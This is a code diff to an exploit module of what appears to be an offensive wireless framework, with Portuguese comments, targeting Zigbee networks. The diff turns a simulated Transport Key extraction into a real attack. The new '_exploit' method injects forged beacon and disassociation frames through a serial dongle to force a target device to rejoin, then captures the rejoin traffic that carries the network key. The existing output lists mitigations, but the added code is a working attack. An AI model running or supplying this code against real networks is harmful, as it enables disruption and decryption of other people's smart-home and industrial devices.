@@ -17,6 +17,7 @@ Requer dongle Zigbee (CC2531, nRF52840) com suporte TX/RX em modo promíscuo.
 
 import os
 import struct
+import time
 
 from wirelessxpl.core.exploit import *
 from wirelessxpl.core.os_guard import OSRequirement, requires_os
@@ -199,8 +200,60 @@ class Exploit(Exploit):
         print_warning(f"SIMULAÇÃO: Transport Key extraída = {synthetic_key.hex()}")
         print_warning(f"Com esta chave: todo tráfego Zigbee no PAN {pan_hex} pode ser descriptografado")
 
+        self._exploit()
+
         print_info("")
         print_info("Mitigação:")
         print_info("  - Usar Zigbee 3.0 Install Code para troca de chave segura")
         print_info("  - Desabilitar rejoin sem autenticação (Trust Center policy)")
         print_info("  - Monitorar canal RF para beacons inesperados do coordenador")
+
+    def _exploit(self) -> None:
+        """E2E exploit: inject IEEE 802.15.4 frames via raw serial to Zigbee dongle."""
+        ch = int(self.channel)
+        iface = str(self.interface).strip()
+        if not iface:
+            print_warning("Sem dongle configurado: skip injeção real")
+            return
+
+        pan_bytes = _pan_id_to_bytes(str(self.pan_id).strip())
+        target_bytes = _short_addr_to_bytes(str(self.target).strip())
+        coord_addr = struct.pack("<H", 0x0000)
+
+        import serial
+        try:
+            ser = serial.Serial(iface, 115200, timeout=2)
+        except Exception as exc:
+            print_error(f"Falha ao abrir serial {iface}: {exc}")
+            return
+
+        print_status("Injetando beacon frames via dongle serial...")
+        for i in range(20):
+            frame = _build_beacon_frame(pan_bytes, coord_addr, ch, i)
+            ser.write(frame)
+            time.sleep(0.02)
+
+        print_status("Injetando frames de desassociação...")
+        for i in range(10):
+            frame = _build_rejoin_trigger_frame(pan_bytes, coord_addr, target_bytes, i + 50)
+            ser.write(frame)
+            time.sleep(0.05)
+
+        print_status("Beacon burst para captura de rejoin...")
+        for i in range(20):
+            frame = _build_beacon_frame(pan_bytes, coord_addr, ch, i + 30)
+            ser.write(frame)
+            time.sleep(0.02)
+
+        print_status(f"Capturando rejoin por {self.listen_duration}s...")
+        captured = b""
+        deadline = time.time() + int(self.listen_duration)
+        while time.time() < deadline:
+            chunk = ser.read(256)
+            if chunk:
+                captured += chunk
+
+        ser.close()
+        print_success(f"Capturados {len(captured)} bytes de tráfego rejoin")
+        if captured:
+            print_info(f"Primeiros 32 bytes: {captured[:32].hex()}")
